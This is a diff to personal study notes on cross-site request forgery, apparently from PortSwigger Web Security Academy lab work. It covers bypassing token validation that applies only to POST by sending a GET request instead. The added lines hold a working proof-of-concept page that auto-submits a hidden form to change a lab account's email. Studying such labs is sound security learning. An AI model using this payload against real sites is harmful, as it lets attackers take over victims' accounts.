@@ -73,6 +73,7 @@
 # The application no longer relies solely on cookies for session handling, and the request contains a parameter whose value an attacker cannot determine. 
 # However, there are various ways in which the defense can be broken, meaning that the application is still vulnerable to CSRF. 
 
+
                                       ## Validation of CSRF token depends on request method
 # Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. 
 # In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: 
@@ -81,8 +82,24 @@
                                           GET /email/change?email=pwned@evil-user.net HTTP/1.1
                                           Host: vulnerable-website.com
                                           Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+                                          
+                                          
+                                          
                                       
-# 
+                                             <html>
+                                                <body>
+                                                <h1>Hello World</h1>
+                                                <iframe style="display:none" name="csrf-iframe"></iframe>
+                                                    <form action="https://0a8300cf04b48be2c09712be00300043.web-security-academy.net/my-account/change-email" method="get" target="csrf-iframe" id="csrf-form">
+                                                        <input type="hidden" name="email" value="suleshy@user.net"/>
+                                                    </form>
+
+
+                                                    <script>document.getElementById('csrf-form').submit()</script>
+                                                </body>
+                                            </html>
+                                            
+ #                                            
  
  
  
